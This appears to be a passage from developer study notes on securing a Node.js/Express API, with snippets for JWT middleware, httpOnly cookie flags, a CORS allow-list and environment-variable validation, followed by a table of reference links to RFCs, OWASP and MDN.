## Code Patterns Introduced

### JWT auth middleware — complete pattern
```js
// On login
const token = jwt.sign(
  { userId: user.id, role: user.role }, // minimal payload
  process.env.JWT_SECRET,
  { expiresIn: '15m' }                  // always short
);

// Protected route middleware
const auth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return next(new AppError('No token', 401));
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    next(new AppError('Invalid or expired token', 401));
  }
};
```

### httpOnly cookie — secure defaults
```
Set-Cookie: token=...; HttpOnly; SameSite=Strict; Secure

HttpOnly     → JS cannot read it — XSS safe
SameSite=Strict → browser won't send on cross-site requests — CSRF mitigated
Secure       → HTTPS only
```

### CORS — production-ready config
```js
const allowedOrigins = [
  'https://app.myapp.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
];

app.use(cors({
  origin: (origin, cb) => {
    if (!origin || allowedOrigins.includes(origin)) cb(null, true);
    else cb(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
}));
```

### Environment validation — fail fast pattern
```js
// config/env.js
['MONGODB_URI', 'JWT_SECRET', 'STRIPE_SECRET_KEY'].forEach(key => {
  if (!process.env[key]) throw new Error(`Missing env var: ${key}`);
});

module.exports = {
  mongoUri: process.env.MONGODB_URI,
  jwtSecret: process.env.JWT_SECRET,
  port: process.env.PORT || 3000,
  isProd: process.env.NODE_ENV === 'production'
};
```

---

## References

| Topic | Link |
|---|---|
| JWT Introduction | https://jwt.io/introduction |
| RFC 7519 — JSON Web Token | https://www.rfc-editor.org/rfc/rfc7519 |
| RFC 8725 — JWT Best Practices | https://www.rfc-editor.org/rfc/rfc8725 |
| jsonwebtoken — npm | https://www.npmjs.com/package/jsonwebtoken |
| Auth0 — Refresh Tokens | https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/ |
| Express Session Middleware | https://expressjs.com/en/resources/middleware/session.html |
| connect-redis | https://www.npmjs.com/package/connect-redis |
| Redis — Why In-Memory | https://redis.io/docs/about/ |
| OWASP — XSS | https://owasp.org/www-community/attacks/xss/ |
| OWASP — CSRF | https://owasp.org/www-community/attacks/csrf |
| MDN — httpOnly Cookie | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly |
| MDN — SameSite | https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite |
| MDN — Same-Origin Policy | https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy |
| MDN — CORS | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS |
| MDN — Preflight Requests | https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request |
| MDN — Simple Requests | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests |
| MDN — CORS Headers | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#the_http_response_headers |
| Express CORS Middleware | https://expressjs.com/en/resources/middleware/cors.html |
| dotenv — npm | https://www.npmjs.com/package/dotenv |
| Twelve-Factor App — Config | https://12factor.net/config |
| OWASP — Sensitive Data Exposure | https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure |
| GitHub — Secret Scanning | https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning |
| BFG Repo Cleaner | https://rtyley.github.io/bfg-repo-cleaner/ |
| git-secrets — AWS Labs | https://github.com/awslabs/git-secrets |

---

